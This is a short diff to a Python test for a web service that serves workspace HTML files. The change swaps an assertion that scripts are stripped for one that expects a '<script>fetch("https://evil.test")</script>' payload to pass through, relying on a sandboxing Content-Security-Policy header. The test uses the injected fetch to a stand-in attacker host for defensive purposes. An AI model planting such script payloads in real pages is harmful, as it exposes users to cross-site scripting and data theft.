@@ -322,7 +322,9 @@ uvicorn.run('runtime_service.webapp:app', fd=int(sys.argv[1]), log_level='error'
                             params={"path": "/workspace/work/view.html"},
                         )
                         self.assertEqual(result.status_code, 200, result.text)
-                        self.assertNotIn("<script", result.text)
+                        self.assertIn(
+                            '<script>fetch("https://evil.test")</script>', result.text
+                        )
                         self.assertIn("Content-Security-Policy", result.text)
                         self.assertIn(
                             "sandbox", result.headers["content-security-policy"]
